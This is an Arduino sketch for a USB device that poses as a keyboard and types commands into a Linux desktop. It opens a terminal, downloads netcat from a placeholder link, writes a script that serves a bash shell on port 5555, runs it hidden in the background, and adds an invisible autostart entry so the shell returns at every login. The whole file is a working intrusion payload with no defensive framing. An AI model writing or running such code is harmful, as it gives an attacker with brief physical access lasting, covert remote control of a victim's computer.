#include <HID-Project.h>
#include <HID-Settings.h>

// Configuration constants
const char* NETCAT_URL = "http://[NETCAT_DOWNLOAD_LINK]/nc";
const char* NETCAT_PORT = "5555";
const char* WORKING_DIR = "/tmp";
const int CMD_DELAY = 500;
const int LONG_DELAY = 1500;
const int SHORT_DELAY = 50;

// Utility function to simulate key press and release
void typeKey(int key) {
  Keyboard.press(key);
  delay(SHORT_DELAY);
  Keyboard.release(key);
}

// Utility function to execute a command with Enter key
void executeCommand(const char* command) {
  Keyboard.print(command);
  typeKey(KEY_RETURN);
  delay(CMD_DELAY);
}

// Utility function to open a terminal (assuming a common Linux desktop environment)
void openTerminal() {
  // Open terminal using Ctrl+Alt+T (common shortcut in many Linux DEs)
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press('t');
  Keyboard.releaseAll();
  delay(LONG_DELAY);
}

// Utility function to create a file with content
void createFile(const char* filename, const char* content[], int lineCount) {
  executeCommand((String("cat > ") + filename).c_str());
  for (int i = 0; i < lineCount; i++) {
    Keyboard.print(content[i]);
    typeKey(KEY_RETURN);
  }
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press('d'); // End file input with Ctrl+D
  Keyboard.releaseAll();
  delay(CMD_DELAY);
}

void setup() {
  // Initialize HID devices
  AbsoluteMouse.begin();
  Keyboard.begin();

  // Open terminal
  openTerminal();

  // Change to temporary directory
  executeCommand((String("cd ") + WORKING_DIR).c_str());

  // Clean up existing files and processes
  const char* cleanupCommands[] = {
    "pkill -f nc", // Kill any running Netcat instances
    "rm -f nc",
    "rm -f start.sh",
    "rm -f /tmp/hidden.sh",
    "rm -f ~/.config/autostart/hidden.desktop"
  };
  for (const char* cmd : cleanupCommands) {
    executeCommand(cmd);
  }

  // Download Netcat
  executeCommand((String("wget -O nc ") + NETCAT_URL).c_str());

  // Make Netcat executable
  executeCommand("chmod +x nc");

  // Create start.sh script
  const char* scriptContent[] = {
    "#!/bin/bash",
    (String("cd ") + WORKING_DIR).c_str(),
    (String("./nc -l -p ") + NETCAT_PORT + " -e /bin/bash").c_str()
  };
  createFile("start.sh", scriptContent, 3);

  // Make start.sh executable
  executeCommand("chmod +x start.sh");

  // Create hidden.sh for background execution
  const char* hiddenContent[] = {
    "#!/bin/bash",
    (String("nohup ") + WORKING_DIR + "/start.sh > /dev/null 2>&1 &").c_str()
  };
  createFile("/tmp/hidden.sh", hiddenContent, 2);

  // Make hidden.sh executable
  executeCommand("chmod +x /tmp/hidden.sh");

  // Create autostart entry for persistence
  const char* desktopContent[] = {
    "[Desktop Entry]",
    "Type=Application",
    "Name=Hidden",
    "Exec=/tmp/hidden.sh",
    "Hidden=false",
    "NoDisplay=true"
  };
  createFile("~/.config/autostart/hidden.desktop", desktopContent, 6);

  // Start the payload in the background
  executeCommand("/tmp/hidden.sh");

  // Close the terminal
  executeCommand("exit");

  // Terminate HID devices
  Keyboard.end();
  AbsoluteMouse.end();
}

void loop() {
  // Empty loop as payload runs once
}